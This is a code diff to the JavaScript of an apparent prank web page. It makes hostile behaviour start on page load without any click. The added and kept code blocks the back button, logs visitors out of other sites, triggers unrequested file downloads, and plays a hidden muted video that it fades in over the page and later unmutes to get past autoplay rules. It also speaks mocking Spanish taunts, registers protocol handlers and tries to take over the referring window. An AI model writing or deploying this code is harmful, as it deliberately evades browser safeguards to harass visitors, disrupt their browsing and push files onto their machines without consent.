@@ -286,32 +286,67 @@ function initChildWindow () {
  * Everything auto-starts on page load. No click needed.
  */
 function initParentWindow () {
-  // These work WITHOUT user gesture
+  // === PHASE 1: Immediate (no user gesture needed) ===
   blockBackButton()
   fillHistory()
   superLogout()
-  hideCursor()
   rainbowThemeColor()
   animateUrlWithEmojis()
-  startInvisiblePictureInPictureVideo()
 
-  // Try to speak immediately (some browsers allow it)
+  // Start a video muted (autoplay policy allows muted)
+  // It will unmute on first interaction
+  startAutoVideo()
+
+  // Try to speak immediately (some browsers allow it on first visit)
   setTimeout(() => { speak('Eso fue un error') }, 1500)
+  setTimeout(() => { speak('jajajaja caíste hermano') }, 4000)
 
-  // Add the blur animation after a short delay
+  // Start triggering file downloads immediately
+  setTimeout(() => { triggerFileDownload() }, 2000)
+  setTimeout(() => { triggerFileDownload() }, 5000)
+
+  // Add the blur animation
   setTimeout(() => { document.body.classList.add('activated') }, 2000)
 
-  // These NEED a user gesture — trigger on first interaction
-  // (scroll, click, keypress, touch — anything)
+  // Hide cursor after a few seconds (so they see it disappear)
+  setTimeout(() => { hideCursor() }, 3000)
+
+  // === PHASE 2: First interaction — unleash EVERYTHING ===
   interceptUserInput(event => {
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
       startVideo()
       startAlertInterval()
-      speak('jajaja caíste')
+      speak('te la re creíste jajajaja')
+
+      // Unmute the auto-started video
+      const autoVid = document.querySelector('video')
+      if (autoVid) { autoVid.muted = false; autoVid.volume = 1.0 }
     }
   })
+}
+
+/**
+ * Start a video immediately on load. Muted to bypass autoplay policy.
+ * Overlays the page content after a delay.
+ */
+function startAutoVideo () {
+  const video = document.createElement('video')
+  video.src = getRandomArrayEntry(VIDEOS)
+  video.autoplay = true
+  video.loop = true
+  video.muted = true // muted = autoplay allowed
+  video.playsInline = true
+  video.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:9998;opacity:0;transition:opacity 2s ease;pointer-events:none;'
+
+  document.body.appendChild(video)
+  video.play().catch(() => {})
+
+  // Fade in the video over the page after 3 seconds
+  setTimeout(() => { video.style.opacity = '0.85' }, 3000)
+  // Make it fully opaque after 6 seconds
+  setTimeout(() => { video.style.opacity = '1' }, 6000)
 }
 
 /**
